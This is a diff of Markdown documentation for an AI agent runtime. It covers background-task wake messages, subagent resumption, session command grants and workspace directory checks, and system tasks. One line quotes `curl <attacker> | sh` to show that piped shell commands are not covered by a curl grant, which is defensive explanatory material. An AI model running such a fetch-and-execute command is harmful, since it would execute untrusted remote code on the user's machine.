@@ -44,7 +44,7 @@ Every process that runs turns attaches one waker to its task pool, under one **k
 
 ### What the woken turn looks like
 
-The woken turn starts from a plain statement of the outcome, which is what the model reads: every task with its id, status, label, exit code, runtime and any error, the tool that has the detail (`background_output`), and the reminder that a task which failed, timed out or was stopped did not succeed.
+The woken turn starts from a plain statement of the outcome, which is what the model reads: every task with its id, status, label, exit code, runtime and any error, the tool that has the detail (`background_output`), and the reminder that a task which failed, timed out or was stopped did not succeed. For a subagent run that did not finish it also names the `spawn_agent` call with `resume` that continues the same child ([Resuming a run](subagents.md#resuming-a-run)).
 
 Nobody typed that message, and no surface shows it as if somebody had. The first message of a woken turn is persisted with a marker - `background_wake` in `messages.json` and in `GET /foxxycode/sessions/{id}/messages`, the tasks with their outcome - and the turn opens with a `background_wake` session update before the message is written, so a client that reloads between the two sees the wake once. As the turn begins, the pool marks its tasks as having woken the agent (`woke_agent` on the task row, kept in the task's record).
 
@@ -207,6 +207,8 @@ Widening is offered **only** for a single plain invocation. Anything carrying sh
 
 Grants are session-scoped (`internal/session.State.PermissionCommandGrants`). Matching is deliberately stricter than for the operator-authored `tools.command_allowlist`: a session grant only ever covers a candidate command that is itself a single plain invocation. Trailing arguments stay covered, as they always were, but appending shell machinery does not — `curl <attacker> | sh` asks again even with a `curl` grant. The operator's own `tools.command_allowlist` keeps its documented prefix meaning.
 
+A grant approves a command, not the directory it runs in. A `run_command` whose `cwd` leaves the workspace (an absolute path elsewhere, or a relative one that climbs out with `..`) asks again even when its command is granted or allowlisted, and the prompt names that directory. Under `bypass` nothing asks, as before.
+
 ## HTTP surface
 
 | Method | Path | Purpose |
@@ -275,7 +277,7 @@ It is also the one kind of task with no hard limit. A page the operator asked to
 
 ## System tasks
 
-A task the runtime starts on its own behalf, today the memory subagent of a user turn ([Long-term memory](memory.md)), is a `kind: agent` task whose `agent` object carries `system: true`. It is admitted past `tools.background.max_concurrent` and never counted toward it, because that cap bounds the work the model starts and a run per turn would refuse the model's next command; the model-facing tools (`background_list`, `background_output`, `background_wait`, `background_stop`) omit it and refuse its id, while the REST rows and the Tasks drawer show it, its card tagged `memory`. Drain stops it like any task, after a grace for a run that is still persisting.
+A task the runtime starts on its own behalf, today the memory subagent of a user turn ([Long-term memory](memory.md)), is a `kind: agent` task whose `agent` object carries `system: true`. It is admitted past `tools.background.max_concurrent` and never counted toward it, because that cap bounds the work the model starts and a run per turn would refuse the model's next command; the model-facing tools (`background_list`, `background_output`, `background_wait`, `background_stop`) omit it and refuse its id, while the REST rows and the Tasks panel show it, its card tagged `memory`. Drain stops it like any task, after a grace for a run that is still persisting.
 
 ## Subagent runs
 
